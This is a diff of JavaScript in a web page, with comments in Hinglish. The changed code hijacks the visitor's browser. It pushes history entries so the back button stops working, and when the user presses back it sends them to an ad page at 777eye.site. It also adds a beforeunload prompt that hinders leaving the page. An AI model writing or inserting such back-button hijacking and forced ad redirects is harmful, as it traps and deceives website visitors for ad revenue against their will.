@@ -291,26 +291,19 @@ document.getElementById("cowImage").onclick = function() {
     }, 2669);
 };
 
-	    // Page load hote hi back button ko disable aur custom message ke sath redirect karne ke liye code
+	    // Page load hote hi back button ko disable aur dusre link pe redirect karne ka code
 history.pushState(null, null, window.location.href);
 
 window.onpopstate = function() {
-    // History ko manipulate karke back button disable karna
+    // Back button pe click hote hi target link pe redirect
     history.pushState(null, null, window.location.href);
-
-    // Custom pop-up ya alert message show karna
-    alert("Wait! Click this link to continue.");
-
-    // Target link pe redirect karna
-    window.location.href = "777eye.site/ads.html"; // yahan apna target URL daal do
+    window.location.href = "https://777eye.site/ads.html"; // Apna target URL yahan daalo
 };
 
-// Page reload ya close hone par confirmation prompt dena
+// Page reload ya close hone par confirmation prompt dena (agar chahiye)
 window.addEventListener("beforeunload", function (e) {
     e.preventDefault();
     e.returnValue = '';
-    // Optional: page close hone par bhi direct redirect karna chahte ho toh
-    // window.location.href = "https://example.com";
 });
     </script>
 
